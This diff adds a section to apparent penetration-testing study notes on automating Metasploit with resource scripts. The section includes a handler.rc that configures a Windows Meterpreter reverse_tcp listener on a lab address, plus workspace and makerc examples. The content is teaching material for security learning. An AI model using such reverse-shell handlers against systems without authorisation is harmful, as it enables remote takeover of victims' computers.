@@ -212,3 +212,51 @@ run post/windows/manage/migrate
 ## Automation with [Resource Scripts](https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/) <a href="#automation-with-resource-scripts" id="automation-with-resource-scripts"></a>
 
 Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).
+
+```bash
+ls -al /usr/share/metasploit-framework/scripts/resource 
+```
+
+<figure><img src="../../../../.gitbook/assets/image (221).png" alt=""><figcaption></figcaption></figure>
+
+**`e.g. 1`**
+
+* _Automate the process of setting up a handler for the generated payloads_, by creating a new `handler.rc` file
+
+```bash
+handler.rc *
+                                           
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.42.132
+set LPORT 1234 
+run
+```
+
+* Load and run the recourse script in `msfconsole`
+
+```bash
+msfconsole -q -r handler.rc
+```
+
+<figure><img src="../../../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>
+
+**`e.g. 2`**
+
+```bash
+db_status
+workspace 
+workspace -a TEST
+```
+
+<figure><img src="../../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
+
+**`e.g. 3`**
+
+* Typed in commands in a new `msfconsole` session, can be exported in a new resource script
+
+```bash
+makerc ~/Desktop/portscan.rc
+```
+
+<figure><img src="../../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>
